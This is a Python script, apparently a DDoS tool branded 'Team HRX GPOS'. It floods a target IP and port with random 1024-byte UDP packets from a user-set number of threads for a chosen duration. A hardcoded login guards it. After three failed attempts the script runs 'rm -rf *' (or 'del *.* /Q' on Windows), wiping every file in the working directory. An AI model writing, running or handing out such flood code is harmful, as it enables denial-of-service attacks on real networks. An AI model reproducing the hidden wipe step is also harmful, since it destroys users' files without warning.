import os
import sys
import time
import socket
import threading
import random

# Colors
green = "\033[92m"
red = "\033[91m"
cyan = "\033[96m"
reset = "\033[0m"

# Banner
def show_banner():
    os.system("cls" if os.name == "nt" else "clear")
    print(f"""{cyan}
  _____                      _   _ ____  __  __
 |_   _|__  __ _ _ __ ___   | | | |  _ \\ \\ \\/ /
   | |/ _ \\/ _` | '_ ` _ \\  | |_| | |_) | \\  / 
   | |  __/ (_| | | | | | | |  _  |  _ <  /  \\ 
   |_|\\___|\\__,_|_| |_| |_| |_| |_|_| \\_\\/_/\\_\\

             ██████╗ ██████╗  ██████╗ ███████╗
            ██╔════╝ ██╔══██╗██╔═══██╗██╔════╝
            ██║  ███╗██████╔╝██║   ██║███████╗
            ██║   ██║██╔═══╝ ██║   ██║╚════██║
            ╚██████╔╝██║     ╚██████╔╝███████║
             ╚═════╝ ╚═╝      ╚═════╝ ╚══════╝

    {green}Developer: MD Abdullah
    Facebook: RJ Abdullah
    Telegram: @abdull01h{reset}
""")

# Login System
USERNAME = "sami vau"
PASSWORD = "abdullah vau"
fail_count = 0

def login():
    global fail_count
    while True:
        user = input("Username: ")
        passwd = input("Password: ")
        if user == USERNAME and passwd == PASSWORD:
            print(green + "\n✅ Login successful!\n" + reset)
            break
        else:
            fail_count += 1
            print(red + "\n❌ Incorrect credentials!\n" + reset)
            if fail_count >= 3:
                print(red + "❌ 3 বার ভুল দিয়েছেন! টুল মুছে ফেলা হচ্ছে..." + reset)
                os.system("rm -rf *" if os.name != "nt" else "del *.* /Q")
                sys.exit()

# Validate IP Address
def is_valid_ip(ip):
    try:
        socket.inet_aton(ip)
        return True
    except socket.error:
        return False

# Attack Function
def attack(ip, port, duration):
    timeout = time.time() + duration
    data = random._urandom(1024)
    while time.time() < timeout:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(data, (ip, port))
            print(green + f"[+] Sent packet to {ip}:{port}" + reset)
        except Exception as e:
            print(red + f"[!] Error: {e}" + reset)

# Main Function
def main():
    show_banner()
    login()
    
    ip = input("🎯 Target IP: ").strip()
    if not is_valid_ip(ip):
        print(red + "❌ Invalid IP address!" + reset)
        return
    
    try:
        port = int(input("📍 Port (1-65535): "))
        if port < 1 or port > 65535:
            print(red + "❌ Invalid port number!" + reset)
            return

        threads = int(input("🔁 Threads: "))
        duration = int(input("⏱️ Time (in seconds): "))

        if threads < 1 or duration < 1:
            print(red + "❌ Threads & Time must be greater than 0!" + reset)
            return

    except ValueError:
        print(red + "❌ Invalid input! Only numbers allowed." + reset)
        return

    print(green + f"""
🚀 Attack Starting!
🌐 IP: {ip}
📍 Port: {port}
🔁 Threads: {threads}
⏱️ Time: {duration} seconds
""" + reset)
    print(cyan + "🔄 Live Status Below:\n" + reset)

    for _ in range(threads):
        t = threading.Thread(target=attack, args=(ip, port, duration))
        t.daemon = True
        t.start()

# Entry Point
if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(red + "\n[!] Tool stopped by user." + reset)
    except Exception as e:
        print(red + f"\n[!] Unexpected Error Occurred: {e}" + reset)
        print(red + "[!] Tool crashed. Please check your inputs or system!" + reset)
